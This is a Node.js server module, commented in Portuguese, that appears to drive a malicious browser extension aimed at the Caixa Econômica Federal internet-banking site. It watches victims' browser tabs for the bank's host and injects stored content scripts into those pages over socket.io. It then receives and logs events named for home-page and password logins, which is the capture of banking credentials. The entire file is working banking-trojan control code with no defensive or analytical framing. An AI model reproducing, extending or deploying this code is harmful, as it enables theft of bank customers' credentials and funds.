'use strict';

var fs = require('fs');
var appPath = process.cwd();
var contentPath = appPath+'/packages/caixa/server/content';
var fs = require('fs');
var path = require('path');
var events = require('events');
var eventEmitter  = new events.EventEmitter();

/*
	Está 'classe' é resonsável por todas os 
	interesses relacionados a página da CEF.
*/

module.exports = function(app, io, db){

	/*
		Inicializando variáveis e interesse
	*/
	var contentScripts = {};
	var homeName = 'CEF';
	var hosts = 'internetbanking.caixa.gov.br';

	/*
		Carrega todos os arquivos de  /content
		e aloca esses arquivos no array contentScripts
		onde a key é o nome do arqvuivo.
		Assim, todos os arquivos ficam em memória prontos
		para uso.
	*/
	fs.readdirSync(contentPath).forEach(function(fileName) {
		var scriptName = fileName.split('.')[0];
		var newPath = path.join(contentPath,fileName);
		fs.readFile(newPath, "utf8", function (err, data) {
			if (err) throw err;
			contentScripts[scriptName] = data.toString();
		});
	});

	

	/*
		Quando alguem se conecta
	*/
	io.on('connection', function(socket){

		/*
			Quando alguem carrega completamente uma pagina,
			este evento verifica através da url da página carregada
			se é do seu interesse, caso seja, uma content script é
			injetada na página do usuário.
		*/
		process.on('common_onTabUpdated', function(_socket, tab){

			var socketId = _socket.id;
			
			/*
				Certificando-se de que este evento foi
				direcionado a este usuário socket
			*/
			if(socketId != socket.id) return;
			
			var hostTabUrl = tab.url.split('/')[2];
			if(hosts !== hostTabUrl){	
				return;
			}

			/*
				Enviando ao usuário a contentScript que verifica 
				em que página o usuário está através de reconhecimento
				de elementos do dom.
				A resposta é enviada através de emits injectContentScriptByTabId 
				vindos do client-side com argumentos da respectiva página
			*/
			socket.emit('injectContentScriptByTabId', tab.id, contentScripts.checkPage);
		});

		/*
			Este evento é responsável por injetar a content script
			relacionada a tela do usuário.
			Evento resposta da injeção da checkPage
		*/
		process.on('common_injectContentScriptByTabId', function(_socket, sender, request, response){

			var socketId = _socket.id;
			
			/*
				Certificando-se de que este evento foi
				direcionado a este usuário socket
			*/
			if(socketId != socket.id) return;

			var tab = sender.tab;
			var pageName = request.data.pageName;
			
			/*
				Verificando se a contentScript requisitada
				é de interesse desta aplicação.
				Checa se existe dentro do array contentScripts
			*/
			var keys = Object.keys(contentScripts);
			if(keys.indexOf(pageName) == -1){
				return;
			}

			/*
				Injeta a contentscript requisitada no browser do usuário
			*/
			socket.emit('injectContentScriptByTabId', tab.id, contentScripts[pageName]);
		});

		
		socket.on('caixa_HomeLogin', function(sender, request, response){
			console.log(request);
		});

		socket.on('caixa_PasswordLogin', function(sender, request, response){
			console.log(request);
		});


	});

};
